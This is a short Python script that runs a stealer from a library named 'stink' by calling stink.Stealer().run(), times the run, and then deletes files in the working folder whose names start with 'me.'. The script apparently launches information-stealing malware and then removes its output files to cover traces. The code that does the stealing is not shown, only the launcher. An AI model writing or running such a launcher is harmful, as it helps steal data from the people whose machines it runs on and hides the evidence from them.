import stink
from datetime import datetime
import os

if __name__ == "__main__":
    startTime = datetime.now()
    stink.Stealer().run()
    print(datetime.now() - startTime)
    folder_path = "."
    for file_name in os.listdir(folder_path):
        if file_name.startswith("me."):
            os.remove(os.path.join(folder_path, file_name))
